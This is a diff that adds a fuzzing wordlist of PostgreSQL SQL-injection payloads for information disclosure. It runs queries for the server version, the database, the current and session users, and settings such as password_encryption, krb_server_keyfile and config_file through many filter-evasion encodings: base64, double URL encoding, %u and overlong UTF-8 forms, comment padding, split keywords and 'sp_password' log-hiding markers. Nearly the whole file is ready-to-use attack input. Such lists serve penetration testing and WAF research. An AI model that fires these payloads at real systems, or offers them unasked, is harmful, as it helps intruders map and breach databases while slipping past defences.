@@ -1,0 +1,1445 @@
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+%00
+IyBpbmZvIGRpc2Nsb3N1cmUgcGF5bG9hZCBmdXp6ZmlsZSBmb3IgcGdzcWwK
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+%2523%2520%2569%256E%2566%256F%2520%2564%2569%2573%2563%256C%256F%2573%2575%2572%2565%2520%2570%2561%2579%256C%256F%2561%2564%2520%2566%2575%257A%257A%2566%2569%256C%2565%2520%2566%256F%2572%2520%2570%2567%2573%2571%256C%250A
+%23%20%69%6E%66%6F%20%64%69%73%63%6C%6F%73%75%72%65%20%70%61%79%6C%6F%61%64%20%66%75%7A%7A%66%69%6C%65%20%66%6F%72%20%70%67%73%71%6C%0A
+%u0023%u0020%u0069%u006E%u0066%u006F%u0020%u0064%u0069%u0073%u0063%u006C%u006F%u0073%u0075%u0072%u0065%u0020%u0070%u0061%u0079%u006C%u006F%u0061%u0064%u0020%u0066%u0075%u007A%u007A%u0066%u0069%u006C%u0065%u0020%u0066%u006F%u0072%u0020%u0070%u0067%u0073%u0071%u006C%u000A
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+%C0%AB%C0%AAinfo%C0%AAdisclosure%C0%AApayload%C0%AAfuzzfile%C0%AAfor%C0%AApgsql%C0%8A
+%# %i%n%f%o %d%i%s%c%l%o%s%u%r%e %p%a%y%l%o%a%d %f%u%z%z%f%i%l%e %f%o%r %p%g%s%q%l%
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+ and '0having'='0having'
+# info disclosure payload fuzzfile for pgsql
+sp_password
+#/**/info/**/disclosure/**/payload/**/fuzzfile/**/for/**/pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+#%02info%0Adisclosure%0Apayload%08fuzzfile%04for%02pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+#%0Ainfo%0Cdisclosure%0Cpayload%0Cfuzzfile%0Cfor%09pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+#+info+disclosure+payload+fuzzfile+for+pgsql
+
+#%0Ainfo%0Adisclosure%0Cpayload%0Cfuzzfile%0Afor%0Dpgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+# info disclosure payload fuzzfile for pgsql
+
+select version();	
+
+select version();	
+
+select version();	
+%00
+c2VsZWN0IHZlcnNpb24oKTsJCg==
+select version();	
+
+select version();	
+
+%2573%2565%256C%2565%2563%2574%2520%2576%2565%2572%2573%2569%256F%256E%2528%2529%253B%2509%250A
+%73%65%6C%65%63%74%20%76%65%72%73%69%6F%6E%28%29%3B%09%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0028%u0029%u003B%u0009%u000A
+select version();	
+
+select version();	
+
+select version();	
+
+select version();	
+
+select version();	
+
+select version();	
+
+select /*!30403version();	
+*/
+select /*!00000version();	
+*/
+select version();	
+
+SELSELECTECT version();	
+
+select%C0%AAversion%C0%AA%C0%AB%C0%BB%C0%8B%C0%8A
+%s%e%l%e%c%t %v%e%r%s%i%o%n%(%)%;%	%
+
+select version();	
+
+select version();	
+
+select version();	
+ and '0having'='0having'
+select version();	
+-- sp_password
+select/**/version();	
+
+select--XAqahYIJbAYI%0Aversion();--zsDGNnoHTiGu%0A--BUGxELvUHhz%0A
+select%23DlHNjClO%0Aversion();%23gNsCWK%0A%23seSqmUZNNru%0A
+select%23MxnUmyoP%0Aversion();%23evenQH%0A%23gPKlkOQYvXp%0A
+select%01version();	
+
+select%23%0Aversion();%23%0A%23%0A
+select%0Bversion();	
+
+select--%0Aversion();--%0A--%0A
+select+version();	
+
+select%09version();	
+
+select version();	
+
+select version();	
+
+select version();	
+
+select version();	
+
+select version();	
+
+select version();	
+
+select current_database();
+
+select current_database();
+
+select current_database();
+%00
+c2VsZWN0IGN1cnJlbnRfZGF0YWJhc2UoKTsK
+select current_database();
+
+select current_database();
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2564%2561%2574%2561%2562%2561%2573%2565%2528%2529%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%5F%64%61%74%61%62%61%73%65%28%29%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u005F%u0064%u0061%u0074%u0061%u0062%u0061%u0073%u0065%u0028%u0029%u003B%u000A
+select current_database();
+
+select current_database();
+
+select current_database();
+
+select current_database();
+
+select current_database();
+
+select current_database();
+
+select /*!30385current_database();
+*/
+select /*!00000current_database();
+*/
+select current_database();
+
+SELECSELECTT current_database();
+
+select%C0%AAcurrent%C0%DFdatabase%C0%AA%C0%AB%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t%_%d%a%t%a%b%a%s%e%(%)%;%
+
+select current_database();
+
+select current_database();
+
+select current_database();
+ and '0having'='0having'
+select current_database();
+-- sp_password
+select/**/current_database();
+
+select--NJYirPtHj%0Acurrent_database();--zOgIlLMdqhT%0A
+select%23PXUUpJ%0Acurrent_database();%23LprAFVIcIL%0A
+select%23PSrahD%0Acurrent_database();%23nfjIFc%0A
+select%01current_database();
+
+select%23%0Acurrent_database();%23%0A
+select%09current_database();
+
+select--%0Acurrent_database();--%0A
+select+current_database();
+
+select%0Dcurrent_database();
+
+select current_database();
+
+select current_database();
+
+select current_database();
+
+select current_database();
+
+select current_database();
+
+select current_database();
+
+select current_user;
+
+select current_user;
+
+select current_user;
+%00
+c2VsZWN0IGN1cnJlbnRfdXNlcjsK
+select current_user;
+
+select current_user;
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2575%2573%2565%2572%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%5F%75%73%65%72%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u005F%u0075%u0073%u0065%u0072%u003B%u000A
+select current_user;
+
+select current_user;
+
+select current_user;
+
+select current_user;
+
+select current_user;
+
+select current_user;
+
+select /*!30821current_user;
+*/
+select /*!00000current_user;
+*/
+select current_user;
+
+SELESELECTCT current_user;
+
+select%C0%AAcurrent%C0%DFuser%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t%_%u%s%e%r%;%
+
+select current_user;
+
+select current_user;
+
+select current_user;
+ and '0having'='0having'
+select current_user;
+-- sp_password
+select/**/current_user;
+
+select--bZNPna%0Acurrent_user;--PkUvIGf%0A
+select%23vlBJBsuew%0Acurrent_user;%23qVEVjtcY%0A
+select%23uAjsuWy%0Acurrent_user;%23kfAAcDJKgw%0A
+select%02current_user;
+
+select%23%0Acurrent_user;%23%0A
+select%09current_user;
+
+select--%0Acurrent_user;--%0A
+select+current_user;
+
+select%0Acurrent_user;
+
+select current_user;
+
+select current_user;
+
+select current_user;
+
+select current_user;
+
+select current_user;
+
+select current_user;
+
+select session_user;
+
+select session_user;
+
+select session_user;
+%00
+c2VsZWN0IHNlc3Npb25fdXNlcjsK
+select session_user;
+
+select session_user;
+
+%2573%2565%256C%2565%2563%2574%2520%2573%2565%2573%2573%2569%256F%256E%255F%2575%2573%2565%2572%253B%250A
+%73%65%6C%65%63%74%20%73%65%73%73%69%6F%6E%5F%75%73%65%72%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0073%u0065%u0073%u0073%u0069%u006F%u006E%u005F%u0075%u0073%u0065%u0072%u003B%u000A
+select session_user;
+
+select session_user;
+
+select session_user;
+
+select session_user;
+
+select session_user;
+
+select session_user;
+
+select /*!30711session_user;
+*/
+select /*!00000session_user;
+*/
+select session_user;
+
+SELESELECTCT session_user;
+
+select%C0%AAsession%C0%DFuser%C0%BB%C0%8A
+%s%e%l%e%c%t %s%e%s%s%i%o%n%_%u%s%e%r%;%
+
+select session_user;
+
+select session_user;
+
+select session_user;
+ and '0having'='0having'
+select session_user;
+-- sp_password
+select/**/session_user;
+
+select--nCtjkA%0Asession_user;--WWCyjIuyIW%0A
+select%23aTwQMgqa%0Asession_user;%23KndmhuYsKSo%0A
+select%23ZVcYqrmtIm%0Asession_user;%23xeiuorKTYTfG%0A
+select%05session_user;
+
+select%23%0Asession_user;%23%0A
+select%0Asession_user;
+
+select--%0Asession_user;--%0A
+select+session_user;
+
+select%0Csession_user;
+
+select session_user;
+
+select session_user;
+
+select session_user;
+
+select session_user;
+
+select session_user;
+
+select session_user;
+
+select current_setting(%EF%BC%87log_connections%EF%BC%87);
+
+select current_setting(%00%27log_connections%00%27);
+
+select current_setting('log_connections');
+%00
+c2VsZWN0IGN1cnJlbnRfc2V0dGluZygnbG9nX2Nvbm5lY3Rpb25zJyk7Cg==
+select current_setting('log_connections');
+
+select current_setting('log_connections');
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2573%2565%2574%2574%2569%256E%2567%2528%2527%256C%256F%2567%255F%2563%256F%256E%256E%2565%2563%2574%2569%256F%256E%2573%2527%2529%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%5F%73%65%74%74%69%6E%67%28%27%6C%6F%67%5F%63%6F%6E%6E%65%63%74%69%6F%6E%73%27%29%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u005F%u0073%u0065%u0074%u0074%u0069%u006E%u0067%u0028%u0027%u006C%u006F%u0067%u005F%u0063%u006F%u006E%u006E%u0065%u0063%u0074%u0069%u006F%u006E%u0073%u0027%u0029%u003B%u000A
+select current_setting('log_connections');
+
+select current_setting('log_connections');
+
+select current_setting('log_connections');
+
+select current_setting('log_connections');
+
+select current_setting('log_connections');
+
+select current_setting('log_connections');
+
+select /*!30858current_setting('log_connections');
+*/
+select /*!00000current_setting('log_connections');
+*/
+select current_setting('log_connections');
+
+SESELECTLECT current_setting('log_connections');
+
+select%C0%AAcurrent%C0%DFsetting%C0%AA%C0%AFlog%C0%DFconnections%C0%AF%C0%AB%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t%_%s%e%t%t%i%n%g%(%'%l%o%g%_%c%o%n%n%e%c%t%i%o%n%s%'%)%;%
+
+select current_setting('log_connections');
+
+select current_setting('log_connections');
+
+select current_setting('log_connections');
+ and '0having'='0having'
+select current_setting('log_connections');
+-- sp_password
+select/**/current_setting('log_connections');
+
+select--vbyIxTB%0Acurrent_setting('log_connections');--NEYeLeTzs%0A
+select%23eIGnBeYOjS%0Acurrent_setting('log_connections');%23ObmCNVJLaK%0A
+select%23OGEGbrJxDdw%0Acurrent_setting('log_connections');%23QweybQISjGCZ%0A
+select%0Ecurrent_setting('log_connections');
+
+select%23%0Acurrent_setting('log_connections');%23%0A
+select%0Ccurrent_setting('log_connections');
+
+select--%0Acurrent_setting('log_connections');--%0A
+select+current_setting('log_connections');
+
+select%0Dcurrent_setting('log_connections');
+
+select current_setting('log_connections');
+
+select current_setting(%bf%27log_connections');
+
+select current_setting('log_connections');
+
+select current_setting('log_connections');
+
+select current_setting('log_connections');
+
+select current_setting('log_connections');
+
+select current_setting(%EF%BC%87log_statement%EF%BC%87);
+
+select current_setting(%00%27log_statement%00%27);
+
+select current_setting('log_statement');
+%00
+c2VsZWN0IGN1cnJlbnRfc2V0dGluZygnbG9nX3N0YXRlbWVudCcpOwo=
+select current_setting('log_statement');
+
+select current_setting('log_statement');
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2573%2565%2574%2574%2569%256E%2567%2528%2527%256C%256F%2567%255F%2573%2574%2561%2574%2565%256D%2565%256E%2574%2527%2529%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%5F%73%65%74%74%69%6E%67%28%27%6C%6F%67%5F%73%74%61%74%65%6D%65%6E%74%27%29%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u005F%u0073%u0065%u0074%u0074%u0069%u006E%u0067%u0028%u0027%u006C%u006F%u0067%u005F%u0073%u0074%u0061%u0074%u0065%u006D%u0065%u006E%u0074%u0027%u0029%u003B%u000A
+select current_setting('log_statement');
+
+select current_setting('log_statement');
+
+select current_setting('log_statement');
+
+select current_setting('log_statement');
+
+select current_setting('log_statement');
+
+select current_setting('log_statement');
+
+select /*!30328current_setting('log_statement');
+*/
+select /*!00000current_setting('log_statement');
+*/
+select current_setting('log_statement');
+
+SELECSELECTT current_setting('log_statement');
+
+select%C0%AAcurrent%C0%DFsetting%C0%AA%C0%AFlog%C0%DFstatement%C0%AF%C0%AB%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t%_%s%e%t%t%i%n%g%(%'%l%o%g%_%s%t%a%t%e%m%e%n%t%'%)%;%
+
+select current_setting('log_statement');
+
+select current_setting('log_statement');
+
+select current_setting('log_statement');
+ and '0having'='0having'
+select current_setting('log_statement');
+-- sp_password
+select/**/current_setting('log_statement');
+
+select--PDnmfuSgkVp%0Acurrent_setting('log_statement');--iZlElwsCkY%0A
+select%23QxOeOmQHPGkx%0Acurrent_setting('log_statement');%23nGtjha%0A
+select%23Yzumvne%0Acurrent_setting('log_statement');%23hjeGgnW%0A
+select%0Ecurrent_setting('log_statement');
+
+select%23%0Acurrent_setting('log_statement');%23%0A
+select%09current_setting('log_statement');
+
+select--%0Acurrent_setting('log_statement');--%0A
+select+current_setting('log_statement');
+
+select%09current_setting('log_statement');
+
+select current_setting('log_statement');
+
+select current_setting(%bf%27log_statement');
+
+select current_setting('log_statement');
+
+select current_setting('log_statement');
+
+select current_setting('log_statement');
+
+select current_setting('log_statement');
+
+select current_setting(%EF%BC%87port%EF%BC%87);
+
+select current_setting(%00%27port%00%27);
+
+select current_setting('port');
+%00
+c2VsZWN0IGN1cnJlbnRfc2V0dGluZygncG9ydCcpOwo=
+select current_setting('port');
+
+select current_setting('port');
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2573%2565%2574%2574%2569%256E%2567%2528%2527%2570%256F%2572%2574%2527%2529%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%5F%73%65%74%74%69%6E%67%28%27%70%6F%72%74%27%29%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u005F%u0073%u0065%u0074%u0074%u0069%u006E%u0067%u0028%u0027%u0070%u006F%u0072%u0074%u0027%u0029%u003B%u000A
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select /*!30772current_setting('port');
+*/
+select /*!00000current_setting('port');
+*/
+select current_setting('port');
+
+SELECSELECTT current_setting('port');
+
+select%C0%AAcurrent%C0%DFsetting%C0%AA%C0%AFport%C0%AF%C0%AB%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t%_%s%e%t%t%i%n%g%(%'%p%o%r%t%'%)%;%
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+ and '0having'='0having'
+select current_setting('port');
+-- sp_password
+select/**/current_setting('port');
+
+select--RUVCfMkmqVb%0Acurrent_setting('port');--mKPZWrhx%0A
+select%23QYMqoMHhwdHV%0Acurrent_setting('port');%23flAzSI%0A
+select%23duKDnMOwQuf%0Acurrent_setting('port');%23FcXYWDsRPxsY%0A
+select%0Bcurrent_setting('port');
+
+select%23%0Acurrent_setting('port');%23%0A
+select%0Bcurrent_setting('port');
+
+select--%0Acurrent_setting('port');--%0A
+select+current_setting('port');
+
+select%0Acurrent_setting('port');
+
+select current_setting('port');
+
+select current_setting(%bf%27port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting(%EF%BC%87password_encryption%EF%BC%87);
+
+select current_setting(%00%27password_encryption%00%27);
+
+select current_setting('password_encryption');
+%00
+c2VsZWN0IGN1cnJlbnRfc2V0dGluZygncGFzc3dvcmRfZW5jcnlwdGlvbicpOwo=
+select current_setting('password_encryption');
+
+select current_setting('password_encryption');
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2573%2565%2574%2574%2569%256E%2567%2528%2527%2570%2561%2573%2573%2577%256F%2572%2564%255F%2565%256E%2563%2572%2579%2570%2574%2569%256F%256E%2527%2529%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%5F%73%65%74%74%69%6E%67%28%27%70%61%73%73%77%6F%72%64%5F%65%6E%63%72%79%70%74%69%6F%6E%27%29%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u005F%u0073%u0065%u0074%u0074%u0069%u006E%u0067%u0028%u0027%u0070%u0061%u0073%u0073%u0077%u006F%u0072%u0064%u005F%u0065%u006E%u0063%u0072%u0079%u0070%u0074%u0069%u006F%u006E%u0027%u0029%u003B%u000A
+select current_setting('password_encryption');
+
+select current_setting('password_encryption');
+
+select current_setting('password_encryption');
+
+select current_setting('password_encryption');
+
+select current_setting('password_encryption');
+
+select current_setting('password_encryption');
+
+select /*!30293current_setting('password_encryption');
+*/
+select /*!00000current_setting('password_encryption');
+*/
+select current_setting('password_encryption');
+
+SELSELECTECT current_setting('password_encryption');
+
+select%C0%AAcurrent%C0%DFsetting%C0%AA%C0%AFpassword%C0%DFencryption%C0%AF%C0%AB%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t%_%s%e%t%t%i%n%g%(%'%p%a%s%s%w%o%r%d%_%e%n%c%r%y%p%t%i%o%n%'%)%;%
+
+select current_setting('password_encryption');
+
+select current_setting('password_encryption');
+
+select current_setting('password_encryption');
+ and '0having'='0having'
+select current_setting('password_encryption');
+-- sp_password
+select/**/current_setting('password_encryption');
+
+select--YVeXrhCjD%0Acurrent_setting('password_encryption');--YClXGbMGLH%0A
+select%23FZnkca%0Acurrent_setting('password_encryption');%23XticMLmcSdsB%0A
+select%23nyUCwdIMMsH%0Acurrent_setting('password_encryption');%23MqLKOxu%0A
+select%0Bcurrent_setting('password_encryption');
+
+select%23%0Acurrent_setting('password_encryption');%23%0A
+select%09current_setting('password_encryption');
+
+select--%0Acurrent_setting('password_encryption');--%0A
+select+current_setting('password_encryption');
+
+select%0Ccurrent_setting('password_encryption');
+
+select current_setting('password_encryption');
+
+select current_setting(%bf%27password_encryption');
+
+select current_setting('password_encryption');
+
+select current_setting('password_encryption');
+
+select current_setting('password_encryption');
+
+select current_setting('password_encryption');
+
+select current_setting(%EF%BC%87krb_server_keyfile%EF%BC%87);
+
+select current_setting(%00%27krb_server_keyfile%00%27);
+
+select current_setting('krb_server_keyfile');
+%00
+c2VsZWN0IGN1cnJlbnRfc2V0dGluZygna3JiX3NlcnZlcl9rZXlmaWxlJyk7Cg==
+select current_setting('krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2573%2565%2574%2574%2569%256E%2567%2528%2527%256B%2572%2562%255F%2573%2565%2572%2576%2565%2572%255F%256B%2565%2579%2566%2569%256C%2565%2527%2529%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%5F%73%65%74%74%69%6E%67%28%27%6B%72%62%5F%73%65%72%76%65%72%5F%6B%65%79%66%69%6C%65%27%29%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u005F%u0073%u0065%u0074%u0074%u0069%u006E%u0067%u0028%u0027%u006B%u0072%u0062%u005F%u0073%u0065%u0072%u0076%u0065%u0072%u005F%u006B%u0065%u0079%u0066%u0069%u006C%u0065%u0027%u0029%u003B%u000A
+select current_setting('krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+
+select /*!30317current_setting('krb_server_keyfile');
+*/
+select /*!00000current_setting('krb_server_keyfile');
+*/
+select current_setting('krb_server_keyfile');
+
+SELESELECTCT current_setting('krb_server_keyfile');
+
+select%C0%AAcurrent%C0%DFsetting%C0%AA%C0%AFkrb%C0%DFserver%C0%DFkeyfile%C0%AF%C0%AB%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t%_%s%e%t%t%i%n%g%(%'%k%r%b%_%s%e%r%v%e%r%_%k%e%y%f%i%l%e%'%)%;%
+
+select current_setting('krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+ and '0having'='0having'
+select current_setting('krb_server_keyfile');
+-- sp_password
+select/**/current_setting('krb_server_keyfile');
+
+select--JMsQDsmRQgA%0Acurrent_setting('krb_server_keyfile');--UDRjIfWrb%0A
+select%23ncwcXV%0Acurrent_setting('krb_server_keyfile');%23pzsKUwCoJMse%0A
+select%23bEdWnxHq%0Acurrent_setting('krb_server_keyfile');%23zBxeuiBblLTY%0A
+select%03current_setting('krb_server_keyfile');
+
+select%23%0Acurrent_setting('krb_server_keyfile');%23%0A
+select%0Acurrent_setting('krb_server_keyfile');
+
+select--%0Acurrent_setting('krb_server_keyfile');--%0A
+select+current_setting('krb_server_keyfile');
+
+select%0Ccurrent_setting('krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+
+select current_setting(%bf%27krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+
+select current_setting('krb_server_keyfile');
+
+select current_setting(%EF%BC%87virtual_host%EF%BC%87);
+
+select current_setting(%00%27virtual_host%00%27);
+
+select current_setting('virtual_host');
+%00
+c2VsZWN0IGN1cnJlbnRfc2V0dGluZygndmlydHVhbF9ob3N0Jyk7Cg==
+select current_setting('virtual_host');
+
+select current_setting('virtual_host');
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2573%2565%2574%2574%2569%256E%2567%2528%2527%2576%2569%2572%2574%2575%2561%256C%255F%2568%256F%2573%2574%2527%2529%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%5F%73%65%74%74%69%6E%67%28%27%76%69%72%74%75%61%6C%5F%68%6F%73%74%27%29%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u005F%u0073%u0065%u0074%u0074%u0069%u006E%u0067%u0028%u0027%u0076%u0069%u0072%u0074%u0075%u0061%u006C%u005F%u0068%u006F%u0073%u0074%u0027%u0029%u003B%u000A
+select current_setting('virtual_host');
+
+select current_setting('virtual_host');
+
+select current_setting('virtual_host');
+
+select current_setting('virtual_host');
+
+select current_setting('virtual_host');
+
+select current_setting('virtual_host');
+
+select /*!30182current_setting('virtual_host');
+*/
+select /*!00000current_setting('virtual_host');
+*/
+select current_setting('virtual_host');
+
+SESELECTLECT current_setting('virtual_host');
+
+select%C0%AAcurrent%C0%DFsetting%C0%AA%C0%AFvirtual%C0%DFhost%C0%AF%C0%AB%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t%_%s%e%t%t%i%n%g%(%'%v%i%r%t%u%a%l%_%h%o%s%t%'%)%;%
+
+select current_setting('virtual_host');
+
+select current_setting('virtual_host');
+
+select current_setting('virtual_host');
+ and '0having'='0having'
+select current_setting('virtual_host');
+-- sp_password
+select/**/current_setting('virtual_host');
+
+select--AXrzubYCbPOd%0Acurrent_setting('virtual_host');--azPXADbpAWC%0A
+select%23HRpdxjnnR%0Acurrent_setting('virtual_host');%23ThOQoErP%0A
+select%23SurGCfRYL%0Acurrent_setting('virtual_host');%23dlcOIBjXKQIe%0A
+select%07current_setting('virtual_host');
+
+select%23%0Acurrent_setting('virtual_host');%23%0A
+select%0Bcurrent_setting('virtual_host');
+
+select--%0Acurrent_setting('virtual_host');--%0A
+select+current_setting('virtual_host');
+
+select%0Dcurrent_setting('virtual_host');
+
+select current_setting('virtual_host');
+
+select current_setting(%bf%27virtual_host');
+
+select current_setting('virtual_host');
+
+select current_setting('virtual_host');
+
+select current_setting('virtual_host');
+
+select current_setting('virtual_host');
+
+select current_setting(%EF%BC%87port%EF%BC%87);
+
+select current_setting(%00%27port%00%27);
+
+select current_setting('port');
+%00
+c2VsZWN0IGN1cnJlbnRfc2V0dGluZygncG9ydCcpOwo=
+select current_setting('port');
+
+select current_setting('port');
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2573%2565%2574%2574%2569%256E%2567%2528%2527%2570%256F%2572%2574%2527%2529%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%5F%73%65%74%74%69%6E%67%28%27%70%6F%72%74%27%29%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u005F%u0073%u0065%u0074%u0074%u0069%u006E%u0067%u0028%u0027%u0070%u006F%u0072%u0074%u0027%u0029%u003B%u000A
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select /*!30689current_setting('port');
+*/
+select /*!00000current_setting('port');
+*/
+select current_setting('port');
+
+SELESELECTCT current_setting('port');
+
+select%C0%AAcurrent%C0%DFsetting%C0%AA%C0%AFport%C0%AF%C0%AB%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t%_%s%e%t%t%i%n%g%(%'%p%o%r%t%'%)%;%
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+ and '0having'='0having'
+select current_setting('port');
+-- sp_password
+select/**/current_setting('port');
+
+select--Flysda%0Acurrent_setting('port');--fWCgUqYR%0A
+select%23TyGhJAbLdpBH%0Acurrent_setting('port');%23dsXMOccGI%0A
+select%23mYrePdUAo%0Acurrent_setting('port');%23khWlZqJhyrEN%0A
+select%04current_setting('port');
+
+select%23%0Acurrent_setting('port');%23%0A
+select%0Bcurrent_setting('port');
+
+select--%0Acurrent_setting('port');--%0A
+select+current_setting('port');
+
+select%0Acurrent_setting('port');
+
+select current_setting('port');
+
+select current_setting(%bf%27port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting('port');
+
+select current_setting(%EF%BC%87config_file%EF%BC%87);
+
+select current_setting(%00%27config_file%00%27);
+
+select current_setting('config_file');
+%00
+c2VsZWN0IGN1cnJlbnRfc2V0dGluZygnY29uZmlnX2ZpbGUnKTsK
+select current_setting('config_file');
+
+select current_setting('config_file');
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2573%2565%2574%2574%2569%256E%2567%2528%2527%2563%256F%256E%2566%2569%2567%255F%2566%2569%256C%2565%2527%2529%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%5F%73%65%74%74%69%6E%67%28%27%63%6F%6E%66%69%67%5F%66%69%6C%65%27%29%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u005F%u0073%u0065%u0074%u0074%u0069%u006E%u0067%u0028%u0027%u0063%u006F%u006E%u0066%u0069%u0067%u005F%u0066%u0069%u006C%u0065%u0027%u0029%u003B%u000A
+select current_setting('config_file');
+
+select current_setting('config_file');
+
+select current_setting('config_file');
+
+select current_setting('config_file');
+
+select current_setting('config_file');
+
+select current_setting('config_file');
+
+select /*!30467current_setting('config_file');
+*/
+select /*!00000current_setting('config_file');
+*/
+select current_setting('config_file');
+
+SELECSELECTT current_setting('config_file');
+
+select%C0%AAcurrent%C0%DFsetting%C0%AA%C0%AFconfig%C0%DFfile%C0%AF%C0%AB%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t%_%s%e%t%t%i%n%g%(%'%c%o%n%f%i%g%_%f%i%l%e%'%)%;%
+
+select current_setting('config_file');
+
+select current_setting('config_file');
+
+select current_setting('config_file');
+ and '0having'='0having'
+select current_setting('config_file');
+-- sp_password
+select/**/current_setting('config_file');
+
+select--SuhBmkQxb%0Acurrent_setting('config_file');--wYEOMXeg%0A
+select%23iPITIKOq%0Acurrent_setting('config_file');%23bcCfscuHI%0A
+select%23wBInpvqUi%0Acurrent_setting('config_file');%23XMrkvGNO%0A
+select%0Ccurrent_setting('config_file');
+
+select%23%0Acurrent_setting('config_file');%23%0A
+select%09current_setting('config_file');
+
+select--%0Acurrent_setting('config_file');--%0A
+select+current_setting('config_file');
+
